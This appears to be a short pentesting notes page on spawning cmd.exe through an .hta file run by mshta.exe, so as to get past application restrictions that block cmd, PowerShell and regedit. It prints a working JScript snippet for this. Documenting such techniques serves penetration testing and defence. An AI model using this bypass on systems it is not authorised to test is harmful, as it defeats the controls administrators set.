---
sidebar_position: 1
title: "Get a shell with .hta files"
---
# HTA file
Even when common tools like cmd.exe, PowerShell and regedit are blocked, mshta.exe can often still be used to launch commands via .hta files.

```
<script>
  var shell = new ActiveXObject("WScript.Shell");
  shell.Run("cmd.exe");
</script>
```

✅ Why it works:
- .hta runs via mshta.exe, a legitimate Windows binary.
- It often bypasses app restrictions if not explicitly blocked.
- Not an exploit, just living off the land.

Credits: [Jochen den Ouden](https://www.linkedin.com/posts/jochendenouden_e%C3%A9n-van-de-leukste-dingen-van-pentesten-is-activity-7348747101389897730-8k_y/)